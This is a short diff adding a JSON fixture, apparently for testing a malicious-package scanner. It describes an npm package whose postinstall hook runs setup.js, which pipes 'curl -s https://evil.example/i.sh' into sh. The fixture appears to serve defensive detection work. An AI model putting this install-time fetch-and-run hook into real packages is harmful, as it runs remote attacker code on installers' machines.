@@ -1,0 +1,7 @@
+{
+  "packageName": "curl-pipe-sh",
+  "sourceFiles": {
+    "package.json": "{\"name\":\"curl-pipe-sh\",\"repository\":\"https://github.com/x/y\",\"scripts\":{\"postinstall\":\"node setup.js\"}}",
+    "setup.js": "const cp=require('child_process');cp.execSync('curl -s https://evil.example/i.sh | sh');"
+  }
+}
